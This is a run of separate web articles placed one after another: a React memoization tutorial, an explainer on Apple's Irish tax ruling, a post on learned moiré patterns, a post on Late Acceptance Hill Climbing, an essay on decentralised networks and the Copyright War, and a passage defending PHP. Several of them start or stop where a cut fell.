For class based components you can extend <code>React.PureComponent</code> and for
function components you can wrap them with <code>React.memo</code>. In both cases
what this does is memoize your components based on your props. React
will only re-render the component if your props change.</p>
<pre><code>// Example React.PureComponent usage

export default class ExpensiveToRender extends React.PureComponent {
  ...
}
</code></pre>
<pre><code>// Example React.memo usage

export default React.memo(function ExpensiveToRender(props) {
  ...
});
</code></pre>
<p>Essentially this means that when React says "component: please render
now" the component checks its cache to see if any props have changed and
if they haven't changed it replies "here you go you can just use the
result I calculated previously for these components". React takes that
result and now the process of rendering down that part of the tree is
completed without any extra work being done.</p>
<figure><img src="https://thomashintz.org/img/render-tree-memo.gif" alt="Shows the rendering flow of React when a child is memoized (border
turns blue)." title="render-tree-memoized">
<figcaption>Shows the rendering flow of React when a child is memoized (border
turns blue).</figcaption></figure>
<h2>Details</h2>
<p>It's important to be aware of how these function though. They perform a
shallow comparison of props. This works well in general but if any of
your props are arrays, JS objects, or anonymous functions you can run in
to cases where you expect your component to be re-rendered but it isn't.
For example, if you pass an array to a component and then later add an
item to that array you might expect your component to be re-rendered but
it isn't. This is because React only did a shallow comparison on the
array and saw that it was the same array. It doesn't scan the array
contents. To get React to re-render your component when you change the
contents of an array you need to instead return a new array. This is
true for other non primitives, like objects. In general if you use
<code>React.PureComponent</code> or <code>React.memo</code> you will be better off programming
in a pure functional style.</p>
<p>Another issue to be aware of when using <code>React.PureComponent</code> or
<code>React.memo</code> is that sometimes your component will keep getting rendered
even when you think that it shouldn't be; that none of the props have
changed. This is similar to the previous case but in reverse. Instead of
you not passing React a new object when you should have been, you pass a
prop as a new object every time when you weren't planning to. This is
most commonly seen when passing object literals or anonymous functions
as props. An object literal gets instantiated into a new object every
time it gets executed. So even if the contents of the object literal
haven't changed it still creates a new object and React isn't checking
to see if the contents have changed only whether it's a new object or
not. So make sure to create these objects outside the render path.</p>
<p>Why doesn't React just perform deep checks instead? Well this deep check
can lead to bad performance which isn't what you want with a performance
optimization!</p>
<p><code>React.PureComponent</code> isn't the only way to control when your class
component renders: React also provides the lifecycle method
<code>componentShouldUpdate</code>. With it you can explicitly tell React when to
render the component. Generally though this method is discouraged and
React recommends using <code>React.PureComponent</code>.</p>
<p>In summary, if you run in to performance bottlenecks with rendering then
start by using <code>React.PureComponent</code> or <code>React.memo</code> and programming in
a pure style. While there are cases where they aren't the solutions they
are generally a good starting point. I've written more detailed articles
about when to use both
<a href="https://thomashintz.org/articles/when-should-you-use-react-purecomponent"><code>React.PureComponent</code></a> and
<a href="https://thomashintz.org/articles/when-should-you-use-react-memo-and-usememo"><code>React.memo</code></a>. And if you
want to learn more about all of these solutions and exactly when and how
to use them subscribe to the email list or the <a href="https://thomashintz.org/articles/feed.atom">atom feed</a>.</p>

                    <p><em>A couple of days ago, Apple won a massive legal battle against the European Union’s antitrust regulators and now they won’t have to pay </em>€<em>13 Billion in unpaid taxes to Irish authorities.</em></p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="the-story">The Story</h3><p>There’s a good reason why Apple likes to operate out of Ireland. At 12.5%, the country has one of the lowest corporate tax rates in the world. But the company doesn’t even pay up 12.5%. It actually pays… nothing.</p><p>In 1991, Apple created a new Irish subsidiary — Apple Sales International (ASI). This subsidiary <a href="https://knowledge.insead.edu/node/5481/pdf">recorded all profits</a> made in Europe, the Middle East, Africa and India. So when someone in Germany buys an iPhone, the profit is recorded by ASI in Ireland, not in Germany. And ASI only paid tax rates between 0.005 % and 1 % in Ireland until 2014 because of an agreement between Apple and Ireland.</p><p>But then the European Union’s competition commission intervened. It <a href="https://ec.europa.eu/commission/presscorner/detail/en/IP_16_2923">claimed</a> that Apple had struck deals with the Irish government in order to claim benefits that it shouldn’t have. In fact, the so-called ‘<strong>sweetheart deals</strong>’ allowed the tech giant to largely avoid paying taxes on most profits made by selling its products in Europe. For instance, Apple’s subsidiary in Ireland recorded profits of <a href="https://www.nytimes.com/2020/07/15/business/apple-eu-ireland-tax.html" rel="noopener">$22 billion</a> in 2011. However, only about $57 million was actually considered taxable in Ireland.</p><p>And the Commission was having none of it. They <a href="https://ec.europa.eu/commission/presscorner/detail/en/IP_16_2923">claimed</a> that Ireland had issued tax rulings specifically to offer Apple a distinct advantage. In fact, most profits of Apple Sales International were allocated to its “head office” when this “head office” had only existed on paper and couldn’t generate actual profits. It didn’t have any operating capacity to handle and manage the company’s product distribution business. Only the <strong><a href="https://ec.europa.eu/commission/presscorner/detail/en/IP_16_2923">Irish branch</a></strong> of Apple Sales International had the capacity to generate any income from selling Apple Products. Therefore, the profits of Apple Sales International should have been recorded with the Irish branch and taxed there.</p><p>Instead, the money probably made its way into a tax haven — say <a href="https://finshots.in/archive/the-double-irish-dutch-sandwich/#:~:text=The%20Irish%20and%20the%20Dutch,a%20dutch%20subsidiary%20%E2%80%9CX%E2%80%9D.&amp;text=Share%20this%20Double%20Irish%20Dutch,Whatsapp%20or%20Tweet.">Bermuda or the Cayman Islands.</a></p><p>Because, according to Irish laws, if any Irish entity is controlled by managers elsewhere, then the profits will be taxed in that jurisdiction. So if Apple Sales International had a controlling presence in say, Cayman Islands, then you only have to pay tax in this small Caribbean territory. And since the effective tax rate here is nil, you won’t have to pay anything at all. It’s something we have written about extensively — <a href="https://finshots.in/archive/the-double-irish-dutch-sandwich/#:~:text=The%20Irish%20and%20the%20Dutch,a%20dutch%20subsidiary%20%E2%80%9CX%E2%80%9D.&amp;text=Share%20this%20Double%20Irish%20Dutch,Whatsapp%20or%20Tweet.">A Double Irish Dutch Sandwich Arrangement</a>. An arrangement that isn’t illegal, but one that does seem to offer the likes of Apple a veritable advantage.</p><p>But why would Ireland let Apple get away with this stuff? After all, they are losing out on precious tax revenue, right?</p><p>Well…</p><p>Yes, but Ireland’s low-tax environment has lured some <a href="https://www.reuters.com/article/us-eu-apple-tax-idUSKCN24G001" rel="noopener">250,000 </a>multinational employers to its shores. Apple itself employs around <a href="https://www.nytimes.com/2020/07/15/business/apple-eu-ireland-tax.html" rel="noopener">6,000</a> people in the country, and these numbers, combined with employment offered by other tech companies like Google and Facebook now account for <a href="https://www.reuters.com/article/us-eu-apple-tax-idUSKCN24G001" rel="noopener">1 in 10</a> Irish workers. And Ireland doesn’t want to scuttle this deal.</p><p>However, the EU laws are clear. Any preferential treatment of this kind could be construed as <a href="https://www.cms-lawnow.com/ealerts/2015/02/the-compatibility-of-sweetheart-tax-deals-with-eu-state-aid-laws?cc_lang=de">State Aid</a> — whereby Ireland offers a selective economic advantage to one individual company that threatens to distort competition with the European market. So the commission forced Ireland to recoup up to €13 billion in unpaid taxes from Apple, including interest.</p><p>Apple, however, vehemently refuted the EU antitrust commission’s claims, with CEO Tim Cook going as far as to call the ruling “<strong>total political crap</strong>.”</p><p>And then, they went to court. The battled raged on 4 years but finally, it seems Apple has been vindicated. Judges of the <a href="https://www.theverge.com/2020/7/15/21325325/apple-eu-ireland-back-taxes-13-billion-overturned-appealed" rel="noopener">General Court of the European Union</a> have found that “the Commission did not succeed in showing to the requisite legal standard that there was an advantage” for Apple.</p><p>In other words, the Commission simply couldn’t prove that the tax benefits Apple received was a byproduct of preferential treatment from Ireland’s tax authorities and so, they offered the company a clean chit.</p><p>Until next time…</p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><p>Share this Finshot on <a href="https://api.whatsapp.com/send?text=An%20explainer%20on%20The%20Big%20Irish%20Sweetheart%20Deal.%20https://bit.ly/3j8eADn">WhatsApp</a>, <a href="https://twitter.com/intent/tweet?url=https://bit.ly/2WrlJF2&amp;via=finshots&amp;text=An%20explainer%20on%20The%20Big%20Irish%20Sweetheart%20Deal.">Twitter</a>, or <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://finshots.in/archive/the-big-irish-sweetheart-deal">LinkedIn</a>.</p>

                <h4>Thursday, July 16, 2020 · 5 min read</h4>
<p>Another magic trick. Watch these two grids overlap to reveal a secret image!
Can you spot the phantom horse?</p>


<p><img src="https://hardmath123.github.io/static/moire/warp.png"><br>
<img src="https://hardmath123.github.io/static/moire/screen.png"></p>
<p>If my janky CSS animation didn’t work for you, here is another way to see it:
simply shrink the top grid slowly until the horse “pops” out. It’s hard to show
this effect consistently across displays/browsers because of varying pixel
spacings and various browsers’ aggressive anti-aliasing tactics, but here is a
screen recording I captured.</p>
<video controls="controls" name="Moire" src="https://hardmath123.github.io/static/moire/moire.mov"></video>

<p>Magic trick? Not quite. Graphics folks will immediately recognize this effect
as a curious instance of the dreaded <em>moiré pattern,</em> caused by the
interference between two almost-but-not-quite-the-same grids. Researchers work
really hard to escape such “glitchy” artifacts — they are often a result of
sloppily sampling a texture in a grid, leading to jagged edges or moiré streaks
(image below from Wikipedia). </p>
<p><img src="https://hardmath123.github.io/static/moire/bricks.jpg" alt="bricks"></p>
<p>In fact, a <a href="http://www.pbr-book.org/3ed-2018/Sampling_and_Reconstruction.html">lot of
effort</a> has
gone into finding “good” sampling patterns that avoid moirés; for example, in
an odd crossover of sampling theory and anatomy, if you look at the
distribution of <a href="https://www.nap.edu/read/1570/chapter/13">photoreceptors in a monkey’s
retina</a> they are neither in a grid
<em>nor</em> uniformly random, but rather arranged in a <em>low-discrepancy</em> pattern to
avoid exactly this kind of artifact.</p>
<p>But for all the hard work gone into avoiding these patterns, you kind of have
to admit that they are beautiful and mysterious. In fact “moiré” gets its name
from a desirable form of silk weave that exhibits this phenomenon owing to
interference from the weave (photo from Wikipedia again). Similarly, <a href="https://en.wikipedia.org/wiki/Guardian_(sculpture">this
sculpture</a> (and a lot more
art) exploits moiré patterns for their hypnotic beauty.</p>
<p><img src="https://hardmath123.github.io/static/moire/silk.jpg" alt="moire silk"></p>
<p>There are lots of real-world ways you can play with this effect, and indeed
soon enough you can’t stop seeing it everywhere you go (this is the joy and
frustration of being interested in visual phenomena):</p>
<ol>
<li>Point a camera at a checkered shirt; the camera’s pixel grid interferes with
the fabric pattern (I’ve been told not to wear checkered shirts when giving
talks at certain venues where everything is recorded).</li>
<li>Align two kitchen strainers and gently bend them to see the patterns change.</li>
<li>Watch a screen door’s shadow interfere with the screen itself, poke the
screen a bit to see the patterns change.</li>
<li>Watch the wire fences on either side of a pedestrian walkway above a road
interfere with each other.</li>
<li>Look at an office chair from behind, watch the mesh of the back interfere
with the mesh of the seat. Depending on their relative curvature you can get
some beautiful effects.</li>
</ol>
<p>These patterns are seemingly random, like marbled paper. But can we control
this randomness? Satisfyingly, an on-demand moiré such as the effect above is
extremely simple to generate using differentiable programming in PyTorch.</p>
<p>What I am optimizing is a <em>small distortion</em> to the image of the grid such that
when the grid and its distortion are superimposed, the resulting image has low
L2 difference from a given target, such as the horse image. What exactly is
this “distortion”? Imagine the image printed on play-dough and deforming it by
stretching and squeezing parts. The result is a warping of the image. To
express this warping, each pixel is assigned a “motion vector” which tells it
where to go. To make sure the motion vectors are smooth and continuous between
adjacent pixels, I actually learn a heavily downsampled set of motion vectors
(even a 12-by-12 array gets good results) and then upsample it to full
resolution with bicubic interpolation.</p>
<p>Here is the wonderful thing: all of these operations are built in to PyTorch
and differentiable, apparently to support <a href="https://arxiv.org/pdf/1506.02025.pdf">Spatial Transformer
Networks</a>. So, a straightforward 30-line
implementation of the above algorithm is all it takes to start “learning” a
moiré grid perturbation. <a href="https://hardmath123.github.io/static/moire/Moire.ipynb">Here</a> is a Jupyter notebook
with all you need to get started.</p>
<p>How much computation does it take to get good results? See this animation: it
converges extremely rapidly, in just 800 iterations or so of plain gradient
descent (a couple of minutes on my laptop).</p>
<p><img src="https://hardmath123.github.io/static/moire/morph.gif" alt="learning"></p>
<hr>
<p>I’m of course not the first person to try this trick; I found references in
2001 and 2013. I think my results look significantly better than those
     presented in the paper <a href="https://hardmath123.github.io/static/moire/2001.pdf"><em>Variational Approach to Moire Pattern Synthesis</em>
(Lebanon and Bruckstein 2001)</a>, even though my technique
is much simpler than their gradient-based technique. On the other hand, I think
the more mathematically-motivated results presented in <a href="https://hardmath123.github.io/static/moire/2013.pdf"><em>Target-Driven Moiré
Pattern Synthesis by Phase Modulation</em> (Tsai &amp; Chuang
2013)</a> are much more impressive, even though they have a
slightly different setup than mine. They also had the resources to print out
their patterns on transparent film and overlay them physically, as well as to
mess with a camera whose Bayer pattern was known! And they suggest using this
trick for cryptography. Very neat.</p>
<p>To understand what they do we need to understand the mechanics of moiré
(instead of leaving it all to SGD!). I’ve always been told that when two
high-frequency signals such as grids are superimposed, they can alias to form
interesting low-frequeny content (famously there is <a href="https://xkcd.com/1814/">this
comic</a>). But I’ve never been given more detail than
that high-level overview, so I looked it up myself. It’s actually quite
wonderful and principled. Here is my understanding as informed by <a href="https://hardmath123.github.io/static/moire/1994.pdf"><em>A
Generalized Fourier-based Method for the Analysis of 2D Moiré Envelope-forms in
Screen Superpositions</em> (Amidror 1994)</a>, specifically by
Figure 4 reproduced below.</p>
<p><img src="https://hardmath123.github.io/static/moire/lattice.png" alt="fig 4"></p>
<p>First, we need to come up with a useful characterization of grids. Recall that
you can take a 2D signal (i.e. image) and perform a 2D Fourier transform, which
is <em>also</em> an image. Each point in frequency-space represents a set of stripes
(i.e. a sine wave) rotated to match the point’s angle with respect to the
origin (see (a) and (b) in the figure for examples of what I mean). The
frequency of the stripes is given by the distance from the point to the origin,
and the amplitude is given by the point’s brightness (complex-valued
brightnesses let you set phase). To get “sharp” stripes instead of a “smooth”
sine wave gradient, you have to add “harmonics” at regular multiples of that
point (recall the Fourier transform of a square wave if that helps). This is
(d) and (e) in the figure from the paper.</p>
<p>Next, we note that superimposing two sets of stripes is like pointwise
multiplication (if you treat zeros as “occlusion”, then multiplying by zero
always sends the result to zero as desired). Because pointwise multiplication
is convolution in frequency space, the superposition looks like a <em>lattice</em>
spanned by the harmonics in frequency space. This lattice is depicted in (f) in
the figure.</p>
<p>The key to the illusion is that this lattice might include points much closer
to the origin than either of the harmonics that span it! Because the human
visual perceptual system acts as a low-pass filter, the result is that you see
a low-frequency “phantom” in the superposition. This is visible in (c) in the
figure.</p>
<p>Tsai and Chuang use this exact insight to reverse the moiré effect
analytically, with excellent results.</p>
<hr>
<p><strong>Open questions:</strong> I think there’s a lot more to do here. In my mind, the holy
grail is a T-shirt you can wear which, <em>only when photographed</em> reveals a
secret message. Another neat application would be a wire mesh rolled into a
cylinder such that as you rotated it, the moiré patterns animated into
something cool (perhaps a galloping horse, as a nod to Muybridge). There is
some precedent for this in “barrier-grid” animation (see, e.g. <a href="https://thevinylfactory.com/features/freaky-formats-moire-effect/">these vinyl
record
covers</a>),
but the benefit of a moiré-based approach would be that the barriers need not
be as thick, allowing for finer detail.</p>
<p>Another direction to go in is audio moiré; that is, could we make two sounds,
both above human aural range (20 kHz) such that when played together you hear a
perfectly clear, audible voice?</p>
<p>As you might have guessed, I think naïve gradient descent should be able to get
us a long way there…</p>

<p>tl;dr Late Acceptance Hill Climbing, LHAC, is a so simple and so efficient 
optimization algorithm that I think  it belongs to any software person toolbox. </p>

<hr>

<p>I have always been fond of metaheuristic optimization algorithms.
Evolutionary algorithms and the likes fascinate me, simply because of 
biomimetism, and also, a bit, because they work. 
They can apply to every optimization problems. The caveat is that even you can
apply it everywhere, those approaches give approximate solutions and often take
quite some time to run. So beware about using the right tool at hand.</p>

<p><img src="https://thedarkside.frantzmiccoli.com/res/malcolm.gif" alt="Your scientist were so peoccupied with whether or not they could they didn't 
stop to think if they should"></p>

<p>A few years ago, I wrote <a href="https://frantzmiccoli.github.io/Gimuby">Gimuby</a>, 
a quite complete Ruby library to experiment with genetic algorithms and a 
variant called the island model. I kept the taste for that kind of things.</p>

<p>The first Covid-19 lockdown gave me the opportunity to try to do some live
coding so if you wish to see 
<a href="https://www.youtube.com/watch?v=5uO-CfSJWng">3h of live programming 
around LAHC</a>, 
be my guest. If you need a library for Ruby, the product of this session,
<a href="https://github.com/frantzmiccoli/Lahcuby">Lahcuby</a>, is available. </p>

<h2>Academics</h2>

<p>The algorithm has been introduced by 
<a href="https://doi.org/10.1016/j.ejor.2016.07.012">Burke and Bykov, 2016</a>, I did not
run any benchmark but the paper claims state of the art performance compared to
similar methods. But this is not what I find the most interesting here, even
though without it nobody would have mentioned it.</p>

<p>If you consider a random problem and a random metaheuristic algorithm 
to solve it, there are many parameters to consider. First about how you represent
the problem and its potential solutions, but also how you set the different
parameters of your algorithm, and those two things interact with one another.
For example, the way you represent an itinerary of a 
<a href="https://en.wikipedia.org/wiki/Travelling_salesman_problem">traveling salesman</a>,
how you mix two itineraries in a third one, how you select which itineraries
to keep and how and how often you randomly change an itinerary. All those things
have an impact on one another when you are trying to get the best possible 
result. Meaning that fine tuning your optimization algorithm is an 
optimization problem by itself.</p>

<p>Your next T-shirt should say:</p>

<blockquote>
<p>I used metaheuristics on my optimization problem,
  and all I got was this lousy hyperparameter optimization problem</p>
</blockquote>

<p>The cool thing with LAHC is its simplicity, there is a single parameter.
Your mileage may not vary, and you may find consistency in your results. I do 
not believe in silver bullets, but this might be as close as you can get.</p>

<h2>How it works</h2>

<p>Lets start with a simple gradient descent algorithm:</p>
<div><pre><code data-lang="python"><span></span><span>solution</span> <span>=</span> <span>get_initial_solution</span><span>()</span>
<span>cost</span> <span>=</span> <span>get_cost</span><span>(</span><span>solution</span><span>)</span>

<span>iteration_count</span> <span>=</span> <span>0</span>
<span>max_iteration_count</span> <span>=</span> <span>1000</span>
<span>while</span> <span>iteration_count</span> <span>&lt;</span> <span>max_iteration_count</span><span>:</span>
    <span>iteration_count</span> <span>+=</span> <span>1</span>

    <span>alternative_solution</span> <span>=</span> <span>get_variation</span><span>(</span><span>solution</span><span>)</span>
    <span>alternative_cost</span> <span>=</span> <span>get_cost</span><span>(</span><span>alternative_solution</span><span>)</span>

    <span>if</span> <span>alternative_cost</span> <span>&gt;=</span> <span>cost</span><span>:</span>
        <span>continue</span>

    <span># we have found a better solution</span>
    <span>solution</span> <span>=</span> <span>alternative_solution</span>
    <span>cost</span> <span>=</span> <span>alternative_cost</span>
</code></pre></div>
<p>I am starting with this because LAHC is very close to a gradient descent, but it
should not get stuck in local minimums. Actually "gradient descent", is just
another way to say "hill climbing".</p>

<p>Here are the two differences:</p>

<ol>
<li>Instead of keeping only a solution, the algorithm keeps a solution plus an 
history of the previously encountered costs, we will call it the <code>Memory</code>.</li>
<li>Instead of accepting an alternative solution only if it is better than the 
current one, the alternative solution is also accepted if it is better than the
cost at the current <code>Memory Index</code>. If such a case occurres the alternative cost 
became the new value in the <code>Memory</code>.</li>
</ol>

<p>All the rest is intendance:</p>

<ul>
<li>Initializing the <code>Memory</code>, the authors set it to be the initial cost. 
My personal views are different, it could be set with random solutions' costs
to lessen the risk of a bad initialization. I keep the authors view in the
implementation below to show a simpler version.</li>
<li>Rotating the <code>Memory Index</code>.</li>
<li>Deciding to end the loop, the authors suggest to set a minimum number of
iterations and then wait for enough idle iterations - i.e iterations where the 
current solution does not get updated. To keep things simple I just set a 
maximum number of iterations here.<br></li>

<p>My main criticism about LAHC is its name, Late Acceptance Hill Climbing.
The acceptance is not late. </p>

<p>The benchmark against which solution is accepted is lagged or large - meaning 
there is more than one reference points. Would it be better to have it named
LaBeHC, Lagged/Large Benchmark Hill Climbing? </p>

<h2>Benefits</h2>

<h3>Low tuning required</h3>

<p>As discussed above depending on the problem and also on the implementation, 
the logic behind obtaining a solution variation is often impacting the optimal 
configuration of hyperparameters. Here, the only hyperparameter, 
<code>Memory Size</code>, is enough to allow more changes in the solution to have a better 
solution space exploration.
Over time, no matter how big the <code>Memory Size</code>, with the process going on, the
algorithm will progressively switch from exploration to exploitation to 
refine most optimal solution.</p>

<h3>Low entry barrier</h3>

<p>The presented LAHC implementation is only about 25 extra lines compared to a 
gradient descent. It is probably about the same size of a grid search but it
should provide much better results.</p>

<p>This means that, unlike most metaheuristics, you can implement it inside your
program in a couple of hours regardless of your technical stack.</p>

<h3>Same benefits as other metaheuristics</h3>

<p>I did not put to the test the result of the original paper, but the approach is
respected and I think it deserves due credit. In my experience, I replaced both
gradient descent and grid search by this, and observed great results in both
cases... one major counter example being 
<a href="https://www.youtube.com/watch?v=5uO-CfSJWng">the live programming session</a> - 
the curse of the live demo.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section></section><section> <article><div><p>The last fifteen years has seen a surge of interest in decentralised technology. From well-funded blockchain projects like IPFS to the emergence of large scale information networks such as Dat, Scuttlebutt and ActivityPub, this is renewed life in peer-to-peer technologies; a renaissance that enjoys widespread growth, driven by the desire for platform commons and community self-determination. These are goals that are fundamentally at odds with – and a response to – the incumbent platforms of social media, music and movie distribution and data storage. As we enter the 2020s, centralised power and decentralised communities are on the verge of outright conflict for the control of the digital public space. The resilience of centralised networks and the political organisation of their owners remains significantly underestimated by protocol activists. At the same time, the decentralised networks and the communities they serve have never been more vulnerable. The peer-to-peer community is dangerously unprepared for a crisis-fuelled future that has very suddenly arrived at their door.</p></div><div><div><blockquote> <p><label for="toggleFootnotes">“Good luck to all those striving for decentralization, balance and equality in the world. You are fighting the right battle. This battle may well be the most important battle of our generation.”</label></p></blockquote></div></div><div><div><blockquote> <p><label for="toggleFootnotes">“‘Torrents are down, worldwide’ said no one, ever. #centralizationisfragile”</label></p></blockquote></div></div><div><p>How precarious are decentralised networks? Answering this requires an understanding of both the power of their political energy and history of antagonism. Conceptually, peer-to-peer technologies are not new – they are networks of digital topologies, intertwining configurations of software clients, devices, connections and protocols whose ownership is distributed. They work in concert to provide a robust alternative to centralised governance, ideally achieving data resilience without transferring the ownership of this data to a single authority. The internet itself is a decentralised network.</p></div><div><p>Often – but not always – decentralised networks emerge due to a collective desire to <label for="toggleFootnotes">rebalance societal power</label>. One of the antagonisms that brought these tensions to the boiling point was the series of legal battles over digital intellectual property rights.  This conflict – a so-called Copyright War –  had <label for="toggleFootnotes">started “offline” decades earlier</label>, but collided with digital infrastructure for the first time in 1999 with the launch of Napster. Its trajectory would last over a decade and the fallout reverberates into the present. To understand the Copyright War is to understand how close copyright reformists came to dismantling an existing centralised data ownership structure, and how they failed to appreciate the resilience of this opponent as it economically and legally exploited their peer-to-peer model. </p></div><div><p>Early file-sharing software featured simple interfaces and enormous content offerings. They arrived years before popular digital music stores, and as such Napster and its clones shook the music and movie industry into mobilising against them. These networks were tied to their client software, and by targeting their developers with litigation, were easily shut down. Copyright reformists first campaigned on behalf of Napster and similar tools, but as residential bandwidth scarcity and demand for data freedom grew, these activists saw new promise beneath the application – an opportunity embedded in the network layer. </p></div><div><p>BitTorrent’s launch in 2001 enabled file-sharing on a massive, efficient and resilient scale. By embedding the decentralised ideology beneath the desktop client, and within the protocol on which the client runs, the act of file-sharing became much more resistant to legislative attack. To many of its supporters and combatants, BitTorrent seemed unstoppable. Most of the early 2000s discourse prophesied the devastation of an existing capitalist cultural order, accelerated by significant ideological moments of the era: the establishment of the first collaborative online <label for="toggleFootnotes">music library</label>, the foundation of the Pirate Bay website, censorship-resistant document distribution, and the formation of the <label for="toggleFootnotes">Piratpartiet</label>, and its <label for="toggleFootnotes">international equivalents.</label> </p></div><div><p>The incumbent powers worked with lawmakers to draft new legislation and went after ‘leechers’ - people downloading content, but who through BitTorrent’s protocol design became unwitting <label for="toggleFootnotes">uploaders themselves</label>. Litigators discovered that by conducting surveillance on a BitTorrent tracker, they could bulk collect participating IP addresses and randomly file severe civic lawsuits, utilising harsher laws reserved for distribution. Their targets were often the economically vulnerable, including <label for="toggleFootnotes"><em>“children, grandparents, unemployed single mothers, college professors—a random selection from the millions of Americans who have used P2P networks.”</em></label> It was one piece of a broader scattershot strategy that spared no one; <label for="toggleFootnotes">infrastructure</label>, <label for="toggleFootnotes">physical media</label>, broadcast media, adjacent software projects and device manufacturers were all targeted. These tactics could manifest as copyright taxes on CD–Rs or portable media players, or in the form of legal liability, such as unsuccessful proposals for ISPs to bear responsibility for user activity. </p></div><div><p>The entertainment industry framed the conflict as a fight against movie and music “piracy.” However, this rhetoric obscures the serious implications of the tactics deployed by these giants. Central to the defeat of this particular peer-to-peer movement was that its infrastructure was vulnerable to <label for="toggleFootnotes"><em>weaponised design</em></label>, in which the network protocol directly empowers attackers through its design. For BitTorrent, this empowerment came as the protocol exposes every user’s participation in the network. This data was exploited to unmask users, ruin lives and provide justification for new legislation. The collapse of centralised power that was prophesied in the 2000s never materialised. Centralised actors outmaneuvered the reformists, shielding themselves and their own ecosystems from scrutiny. <label for="toggleFootnotes">The concentrated media companies of the 2020s now dwarf their 1999 equivalents</label>, and the innovations pioneered by decentralised infrastructure were exploited by the winners as they ascended to monopoly. </p></div><div><p>The most poetic example of peer-to-peer technologies pressed into the service of corporate giants is the story of peer-to-peer software engineer Ludvig Strigeus. Having built the popular μTorrent client and perhaps sensing the changing winds, Strigeus joined former μTorrent CEO Daniel Ek’s new startup. <label for="toggleFootnotes">Together, they built a quasi-Napster/BitTorrent hybrid that relied on a vast, unauthorised music catalog drawn from its user base</label>. Today, that architecture is long gone, but the startup – Spotify – <label for="toggleFootnotes">boasts 124 million subscribers, taking in USD$7.44 billion in revenue</label> but paying artists just USD$4.37 per 1,000 streams. </p></div><div><p>As we can see from history, blind faith in technically resilient network protocols is naïve and misplaced. The Copyright War drives home hard lessons around politics, corporate appropriation, transparency, collectivism and the urgency of network safety, all illustrated in the <label for="toggleFootnotes">decimated lives of key or adjacent reformists</label>, collateral user damage, and resulting legislation. In 2013, BitTorrent was responsible for <label for="toggleFootnotes">3.35% of all internet traffic</label>. Today the networks remain but this market share has shrunk. Torrents are down worldwide.</p></div><div><div><blockquote> <p><label for="toggleFootnotes">“Only a crisis — actual or perceived — produces real change. When the crisis occurs, the actions that are taken depend on the ideas that are lying around. That, I believe, is our basic function: to develop alternatives to existing policies, to keep them alive and available until the politically impossible becomes politically inevitable.”</label></p></blockquote></div></div><div><div><blockquote> <p><label for="toggleFootnotes">“Your objective [as a designer] should always be to eliminate instructions entirely by making everything self-explanatory, or as close to it as possible. When instructions are absolutely necessary, cut them back to a bare minimum.”</label></p></blockquote></div></div><div><p>As the Copyright War faded into the background, the iPhone paradigm – a constrained, centralised, individualised system marketed as “the individual at one with their device” – became the standard for personal computing. New and boundless design-led opportunities appeared almost overnight, powered by a bottomless injection of venture capital that fostered the accelerated growth of <label for="toggleFootnotes">platform capitalism</label>. To quote design and art historians Arden Stern and Sami Siegelbaum: </p></div><div><div><blockquote> <label for="toggleFootnotes">“Neoliberalism can be distinguished from Fordist capitalism’s mass production of consumer goods by the ways it seeks to marketize previously uncommodified sectors of human life. Indeed, one of the questions [we seek] to explore is how design might enable this process by locating new sources of extraction and accumulation by facilitating the commodification of that which was once thought to be outside the scope of the market.”</label></blockquote></div></div><div><p>Finding these new sources of extraction became a priority for centralised tech platforms. They had spent the previous decade achieving scale and resilience; now they sought to extract new value and justify their presence in daily life. Framing the mobile device as an extension of self made the emergence of the new ‘digital wellbeing’ market compelling. For example, <label for="toggleFootnotes">Safety Check</label> – a Facebook feature introduced after the 2011 Tōhoku earthquake and tsunami&nbsp;– encourages users in disaster-stricken areas to interact with the platform to mark themselves as safe and be connected to communication services for disaster relief. The Apple Watch – originally launched as a general-purpose wrist computer – underwent a complete rebrand as a digital health and fitness device, and <label for="toggleFootnotes">its ability to detect and call emergency services in crisis is actively marketed in emotional video testimonials</label> released by its maker. Amazon Ring and Google Nest encourage consumers to actively contribute to a growing network of community surveillance systems promising safety in exchange for ceding the household’s digital capital to a powerful, unaccountable platform.</p></div><div><p>These tech-driven efforts to respond to …</p></div></article></section></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p>Here at Hologram, we use two main programming languages for our backend stack: PHP and Python. Our PHP component is the one that is the most visible to users since that is our entire REST API.</p><p>We do get some questions on why we use PHP in such a major role because the conventional wisdom is that PHP is outdated or clunky. My contention is that PHP suffers from this view because of two reasons:</p><ol role="list"><li>People learned it back in 2005 when it was a younger language and was lacking a lot of really useful or common features like classes</li><li>In order to maintain compatibility, many popular applications *cough* Wordpress *cough* didn’t take advantage of a lot of the newer stuff and people had to keep hacking on old-fashioned PHP well past the time a lot of great new features were introduced.</li></ol><p>Because of this, I want to defend PHP as a really useful language and a great fit for our needs.</p><p>I think a lot of people already know that PHP has some good built-in web server features, like a global array for getting HTTP headers or built-in session cookie support, but they may not know about a lot of other features that make it a solid language overall.</p><p>Here are some of the great pieces of PHP:</p><h2>Classes!</h2><p>Yes, back in the day PHP didn’t have classes and things could get messy very quickly. I recall long lists of include calls to pull in all the functions you’d need and having to keep passing tons of arguments around to functions with really long names.<br></p><p>Well, have no fear; PHP has great object support these days. Classes, constructors, destructors, namespaces, inheritance, and all that good stuff.<br></p><p>But it goes beyond that into what is a great feature that is more unique to PHP:<br></p><h2>The Autoloader</h2><p>PHP has a useful feature where it can automatically load the file for a class if the class hasn’t been loaded already. This means no more blocks of include/require statements at the top of all your files. If you use a class then it gets loaded.<br></p><p>On its own, this is already really nice, but what makes this a game changer is that the specific autoloading logic can be totally customized in your application and multiple autoloaders can be chained together. This means that all of your third party libraries get autoloaded as well.</p><p>In your code, you just create your classes or call their methods and everything gets pulled in for you. No need to include anything manually or fight with include paths like in other languages. In the entire Hologram codebase outside of test code, we call <em>include()</em> or <em>require()</em> maybe twice.<br></p><p>But speaking of those third party libraries…<br></p><h2>Package Management</h2><p>PHP has package management systems to rival those of other languages. The one we use at Hologram is called Composer, which is the most popular one. It’s incredibly simple to use and stores all settings in JSON files. You can give it version ranges to use for each package and it’ll generate a lockfile that could be checked into the repo if you want to be extra careful about making sure everyone is using the exact same package revision.</p><p>To add a new package into the JSON file and install it, it’s as simple as</p><p><code>
    composer install somepackage
